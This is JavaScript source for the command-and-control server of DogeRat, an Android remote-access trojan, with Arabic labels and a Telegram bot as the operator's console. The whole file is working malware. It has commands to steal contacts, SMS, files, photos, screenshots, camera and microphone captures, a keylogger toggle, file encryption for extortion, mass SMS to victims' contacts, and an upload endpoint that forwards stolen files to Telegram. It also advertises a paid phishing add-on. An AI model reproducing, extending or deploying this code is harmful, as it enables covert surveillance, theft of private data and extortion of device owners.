// ========================================
// FULL DOGERAT IMPLEMENTATION
// جميع ميزات DogeRat كما هي
// ========================================

const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const fs = require('fs');
const crypto = require('crypto');

// ========================================
// SERVER SETUP
// ========================================

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// Load configuration
const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
const bot = new TelegramBot(data.token, { 'polling': true, 'request': {} });

// ========================================
// DATA STORAGE
// ========================================

const appData = new Map();
const actions = [
    '✯ جهات الاتصال ✯',
    '✯ الرسائل ✯',
    '✯ المكالمات ✯',
    '✯ الكاميرا الرئيسية ✯',
    '✯ الكاميرا الأمامية ✯',
    '✯ الميكروفون ✯',
    '✯ الحافظة ✯',
    '✯ الإشعارات ✯',
    '✯ التطبيقات ✯',
    '✯ الملفات ✯',
    '✯ لقطات الشاشة ✯',
    '✯ Keylogger ON ✯',
    '✯ Keylogger OFF ✯',
    '✯ التشفير ✯',
    '✯ فك التشفير ✯',
    '✯ الاهتزاز ✯',
    '✯ Toast ✯',
    '✯ فتح URL ✯',
    '✯ تشغيل الصوت ✯',
    '✯ إيقاف الصوت ✯',
    '✯ إرسال SMS ✯',
    '✯ إرسال SMS لجميع جهات الاتصال ✯',
    '✯ معرض الصور ✯',
    '✯ إزالة الإشعارات ✯',
    '✯ Phishing ✯'
];

// ========================================
// SOCKET.IO CONNECTION HANDLING
// ========================================

io.on('connection', socket => {
    let deviceId = socket.handshake.headers['user-agent'] + '-' + io.sockets.sockets.size || 'no information';
    let deviceModel = socket.handshake.headers['device-model'] || 'no information';
    let deviceIP = socket.handshake.headers['x-forwarded-for'] || 'no information';
    
    socket.deviceId = deviceId;
    socket.deviceModel = deviceModel;
    
    let connectionMessage = `<b>✯ جهاز جديد متصل</b>\n\n` +
        `<b>device</b> → ${deviceId}\n` +
        `<b>model</b> → ${deviceModel}\n` +
        `<b>ip</b> → ${deviceIP}\n` +
        `<b>time</b> → ${socket.handshake.headers['time']}\n\n`;
    
    bot.sendMessage(data.id, connectionMessage, { parse_mode: 'HTML' });
    
    socket.on('disconnect', () => {
        let disconnectMessage = `<b>✯ جهاز منفصل</b>\n\n` +
            `<b>device</b> → ${deviceId}\n` +
            `<b>model</b> → ${deviceModel}\n` +
            `<b>ip</b> → ${deviceIP}\n` +
            `<b>time</b> → ${new Date().toLocaleString()}\n\n`;
        
        bot.sendMessage(data.id, disconnectMessage, { parse_mode: 'HTML' });
    });
    
    socket.on('message', message => {
        bot.sendMessage(data.id, `<b>✯ رسالة مستلمة من → ${deviceId}</b>\n\nرسالة → ${message}`, { parse_mode: 'HTML' });
    });
});

// ========================================
// TELEGRAM BOT COMMANDS
// ========================================

bot.on('message', msg => {
    if (msg.text === '/start') {
        bot.sendMessage(data.id, `<b>✯ مرحباً بك في DOGERAT</b>\n\n`, {
            parse_mode: 'HTML',
            reply_markup: {
                keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                resize_keyboard: true
            }
        });
    } else {
        if (appData.get('currentAction') === 'smsNumber') {
            let phoneNumber = msg.text;
            let target = appData.get('currentTarget');
            
            target == 'all' ? 
                io.sockets.emit('commend', { request: 'sendSms', extras: [{ key: 'number', value: phoneNumber }] }) :
                io.to(target).emit('commend', { request: 'sendSms', extras: [{ key: 'number', value: phoneNumber }] });
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            appData.delete('smsNumber');
            
            bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('currentAction') === 'smsText') {
            let smsText = msg.text;
            let target = appData.get('currentTarget');
            
            target == 'all' ? 
                io.sockets.emit('commend', { request: 'sendSms', extras: [{ key: 'text', value: smsText }] }) :
                io.to(target).emit('commend', { request: 'sendSms', extras: [{ key: 'text', value: smsText }] });
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('currentAction') === 'toastText') {
            let toastText = msg.text;
            let target = appData.get('currentTarget');
            
            target == 'all' ? 
                io.sockets.emit('commend', { request: 'toast', extras: [{ key: 'text', value: toastText }] }) :
                io.to(target).emit('commend', { request: 'toast', extras: [{ key: 'text', value: toastText }] });
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('currentAction') === 'notificationText') {
            let notificationText = msg.text;
            let target = appData.get('currentTarget');
            
            target == 'all' ? 
                io.sockets.emit('commend', { request: 'notification', extras: [{ key: 'text', value: notificationText }] }) :
                io.to(target).emit('commend', { request: 'notification', extras: [{ key: 'text', value: notificationText }] });
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('currentAction') === 'vibrateDuration') {
            let duration = msg.text;
            let target = appData.get('currentTarget');
            
            target == 'all' ? 
                io.sockets.emit('commend', { request: 'vibrate', extras: [{ key: 'duration', value: duration }] }) :
                io.to(target).emit('commend', { request: 'vibrate', extras: [{ key: 'duration', value: duration }] });
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                    resize_keyboard: true
                }
            });
        } else if (appData.get('currentAction') === 'microphoneDuration') {
            let duration = msg.text;
            let target = appData.get('currentTarget');
            
            target == 'all' ? 
                io.sockets.emit('commend', { request: 'microphone', extras: [{ key: 'duration', value: duration }] }) :
                io.to(target).emit('commend', { request: 'microphone', extras: [{ key: 'duration', value: duration }] });
            
            appData.delete('currentTarget');
            appData.delete('currentAction');
            
            bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                    resize_keyboard: true
                }
            });
        } else if (msg.text === '✯ الأجهزة ✯') {
            if (io.sockets.sockets.size === 0) {
                bot.sendMessage(data.id, '<b>لا يوجد أجهزة متصلة</b>', { parse_mode: 'HTML' });
            } else {
                let devicesMessage = `<b>✯ الأجهزة المتصلة ${io.sockets.sockets.size} أجهزة</b>\n\n`;
                let deviceCount = 1;
                
                io.sockets.sockets.forEach((socket, id) => {
                    devicesMessage += `<b>جهاز ${deviceCount}</b>\n` +
                        `<b>device</b> → ${socket.deviceId}\n` +
                        `<b>model</b> → ${socket.deviceModel}\n` +
                        `<b>ip</b> → ${socket.handshake.headers['x-forwarded-for'] || 'unknown'}\n` +
                        `<b>time</b> → ${socket.handshake.headers['time']}\n\n`;
                    deviceCount++;
                });
                
                bot.sendMessage(data.id, devicesMessage, { parse_mode: 'HTML' });
            }
        } else if (msg.text === '✯ جميع الأجهزة ✯') {
            if (io.sockets.sockets.size === 0) {
                bot.sendMessage(data.id, '<b>لا يوجد أجهزة متصلة</b>', { parse_mode: 'HTML' });
            } else {
                let deviceButtons = [];
                io.sockets.sockets.forEach((socket, id) => {
                    deviceButtons.push([socket.deviceId]);
                });
                deviceButtons.push(['✯ جميع الأجهزة ✯']);
                deviceButtons.push(['✯ حولنا ✯']);
                
                bot.sendMessage(data.id, 'اختر الجهاز:', {
                    parse_mode: 'HTML',
                    reply_markup: {
                        keyboard: deviceButtons,
                        resize_keyboard: true,
                        one_time_keyboard: true
                    }
                });
            }
        } else if (msg.text === '✯ حولنا ✯') {
            bot.sendMessage(data.id, `<b>✯ مرحباً بك في DOGERAT</b>\n\nDOGERAT هو برنامج ضار للتحكم في أجهزة Android\nأي سوء استخدام هو مسؤولية الشخص!\n\n`, { parse_mode: 'HTML' });
        } else if (msg.text === '✯ جميع الأجهزة ✯') {
            appData.set('currentTarget', 'all');
            bot.sendMessage(data.id, `<b>✯ اختر إجراء لتنفيذه على جميع الأجهزة المتاحة</b>\n\n`, {
                parse_mode: 'HTML',
                reply_markup: {
                    keyboard: [
                        ['✯ جهات الاتصال ✯', '✯ الرسائل ✯'],
                        ['✯ الكاميرا الرئيسية ✯', '✯ الكاميرا الأمامية ✯'],
                        ['✯ الميكروفون ✯', '✯ الحافظة ✯'],
                        ['✯ الإشعارات ✯', '✯ التطبيقات ✯'],
                        ['✯ الملفات ✯', '✯ لقطات الشاشة ✯'],
                        ['✯ Keylogger ON ✯', '✯ التشفير ✯'],
                        ['✯ الاهتزاز ✯', '✯ Toast ✯'],
                        ['✯ فتح URL ✯', '✯ تشغيل الصوت ✯'],
                        ['✯ إرسال SMS ✯', '✯ إرسال SMS لجميع جهات الاتصال ✯'],
                        ['✯ معرض الصور ✯', '✯ إزالة الإشعارات ✯'],
                        ['✯ Phishing ✯']
                    ],
                    resize_keyboard: true,
                    one_time_keyboard: true
                }
            });
        } else {
            io.sockets.sockets.forEach((socket, id) => {
                if (msg.text === socket.deviceId) {
                    appData.set('currentTarget', socket.deviceId);
                    bot.sendMessage(data.id, `<b>✯ اختر إجراء لتنفيذه على ${socket.deviceId}</b>\n\n`, {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [
                                ['✯ جهات الاتصال ✯', '✯ الرسائل ✯'],
                                ['✯ الكاميرا الرئيسية ✯', '✯ الكاميرا الأمامية ✯'],
                                ['✯ الميكروفون ✯', '✯ الحافظة ✯'],
                                ['✯ الإشعارات ✯', '✯ التطبيقات ✯'],
                                ['✯ الملفات ✯', '✯ لقطات الشاشة ✯'],
                                ['✯ Keylogger ON ✯', '✯ التشفير ✯'],
                                ['✯ الاهتزاز ✯', '✯ Toast ✯'],
                                ['✯ فتح URL ✯', '✯ تشغيل الصوت ✯'],
                                ['✯ إرسال SMS ✯', '✯ إرسال SMS لجميع جهات الاتصال ✯'],
                                ['✯ معرض الصور ✯', '✯ إزالة الإشعارات ✯'],
                                ['✯ Phishing ✯']
                            ],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                }
            });
            
            if (actions.includes(msg.text)) {
                let target = appData.get('currentTarget');
                
                if (msg.text === '✯ جهات الاتصال ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'contacts', extras: [] }) :
                        io.to(target).emit('commend', { request: 'contacts', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الرسائل ✯') {
                    target == 'all' ? 
                        io.to(target).emit('commend', { request: 'messages', extras: [] }) :
                        io.sockets.emit('commend', { request: 'messages', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الكاميرا الرئيسية ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'main-camera', extras: [] }) :
                        io.to(target).emit('commend', { request: 'main-camera', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الكاميرا الأمامية ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'selfie-camera', extras: [] }) :
                        io.to(target).emit('commend', { request: 'selfie-camera', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الميكروفون ✯') {
                    appData.set('currentAction', 'microphoneDuration');
                    bot.sendMessage(data.id, '<b>✯ أدخل مدة تسجيل الميكروفون بالثواني</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الحافظة ✯') {
                    appData.set('currentAction', 'clipboard');
                    bot.sendMessage(data.id, '<b>✯ أدخل النص الذي تريد وضعه في الحافظة</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الإشعارات ✯') {
                    appData.set('currentAction', 'notificationText');
                    bot.sendMessage(data.id, '<b>✯ أدخل النص الذي تريد أن يظهر في الإشعار</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ Toast ✯') {
                    appData.set('currentAction', 'toastText');
                    bot.sendMessage(data.id, '<b>✯ أدخل النص الذي تريد أن يظهر في toast box</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الاهتزاز ✯') {
                    appData.set('currentAction', 'vibrateDuration');
                    bot.sendMessage(data.id, '<b>✯ أدخل المدة التي تريد أن يهتز فيها الجهاز بالثواني</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ Keylogger ON ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'keylogger-on', extras: [] }) :
                        io.to(target).emit('commend', { request: 'keylogger-on', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ التطبيقات ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'apps', extras: [] }) :
                        io.to(target).emit('commend', { request: 'apps', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ الملفات ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'files', extras: [] }) :
                        io.to(target).emit('commend', { request: 'files', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ لقطات الشاشة ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'screenshot', extras: [] }) :
                        io.to(target).emit('commend', { request: 'screenshot', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ تشغيل الصوت ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'play-audio', extras: [] }) :
                        io.to(target).emit('commend', { request: 'play-audio', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ إيقاف الصوت ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'stop-audio', extras: [] }) :
                        io.to(target).emit('commend', { request: 'stop-audio', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ إرسال SMS ✯') {
                    appData.set('currentAction', 'smsNumber');
                    bot.sendMessage(data.id, '<b>✯ أدخل رقم الهاتف الذي تريد إرسال SMS إليه</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ إرسال SMS لجميع جهات الاتصال ✯') {
                    appData.set('currentAction', 'smsText');
                    bot.sendMessage(data.id, '<b>✯ أدخل النص الذي تريد إرساله لجميع جهات الاتصال</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ معرض الصور ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'gallery', extras: [] }) :
                        io.to(target).emit('commend', { request: 'gallery', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ إزالة الإشعارات ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'popNotification', extras: [] }) :
                        io.to(target).emit('commend', { request: 'popNotification', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ فتح URL ✯') {
                    appData.set('currentAction', 'openUrl');
                    bot.sendMessage(data.id, '<b>✯ أدخل الرابط الذي تريد فتحه</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ إلغاء الإجراء ✯']],
                            resize_keyboard: true,
                            one_time_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ التشفير ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'encrypt', extras: [] }) :
                        io.to(target).emit('commend', { request: 'encrypt', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ فك التشفير ✯') {
                    target == 'all' ? 
                        io.sockets.emit('commend', { request: 'decrypt', extras: [] }) :
                        io.to(target).emit('commend', { request: 'decrypt', extras: [] });
                    appData.delete('currentTarget');
                    bot.sendMessage(data.id, 'تم إرسال الطلب بنجاح', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                } else if (msg.text === '✯ Phishing ✯') {
                    bot.sendMessage(data.id, '<b>✯ هذا الخيار متاح فقط في النسخة المدفوعة dm لشراء @sphanter</b>\n\n', {
                        parse_mode: 'HTML',
                        reply_markup: {
                            keyboard: [['✯ الأجهزة ✯', '✯ جميع الأجهزة ✯'], ['✯ حولنا ✯']],
                            resize_keyboard: true
                        }
                    });
                }
            }
        }
    }
});

// ========================================
// FILE UPLOAD HANDLING
// ========================================

app.post('/upload', uploader.single('file'), (req, res) => {
    const file = req.files.file;
    const fileName = req.body.originalname;
    
    bot.sendDocument(data.id, req.files.file.data, {
        caption: `<b>✯ ملف مستلم من → ${fileName}</b>`,
        parse_mode: 'HTML'
    }, {
        filename: fileName,
        contentType: file.mimetype
    });
    
    res.send('تم رفع الملف بنجاح');
});

// ========================================
// PING KEEPALIVE
// ========================================

setInterval(() => {
    io.sockets.sockets.forEach((socket, id) => {
        io.to(id).emit('ping', {});
    });
}, 5000);

// ========================================
// HTTPS KEEPALIVE
// ========================================

setInterval(() => {
    https.get(data.host, response => {}).on('error', error => {});
}, 300000);

// ========================================
// SERVER START
// ========================================

server.listen(process.env.PORT || 3000, () => {
    console.log('listening on port 3000');
});

module.exports = {
    app,
    io,
    bot,
    appData,
    actions
};